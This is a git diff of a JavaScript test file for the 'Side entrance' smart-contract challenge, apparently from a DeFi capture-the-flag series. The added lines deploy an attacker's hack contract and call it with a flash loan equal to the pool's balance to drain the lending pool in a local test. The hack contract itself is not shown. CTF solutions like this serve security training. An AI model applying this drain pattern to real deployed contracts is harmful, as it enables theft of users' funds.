@@ -25,6 +25,12 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // first deploy our hack contract - make sure attacker is the one deploying
+        const SideEntranceHack = await ethers.getContractFactory('SideEntranceLenderPoolHack', attacker);
+        sidehack = await SideEntranceHack.connect(attacker).deploy();
+        // then we call the hack fct - again as the attacker, and we flashloan with the same amount as is in the pool
+        let tx = await sidehack.connect(attacker).hack(this.pool.address, {value: ETHER_IN_POOL});
+        await tx.wait(); // wait for it to mine
     });
 
     after(async function () {
